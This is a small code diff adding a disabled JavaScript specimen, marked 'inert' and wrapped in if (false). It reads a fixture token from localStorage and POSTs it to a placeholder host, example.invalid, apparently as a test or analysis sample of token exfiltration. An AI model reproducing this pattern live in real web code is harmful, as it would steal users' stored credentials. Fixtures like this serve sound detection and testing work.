@@ -1,0 +1,5 @@
+// Inert specimen: static reading only.
+if (false) {
+  const token = window.localStorage.getItem('fixture_only_token');
+  fetch('https://example.invalid/collect', {method: 'POST', body: token});
+}
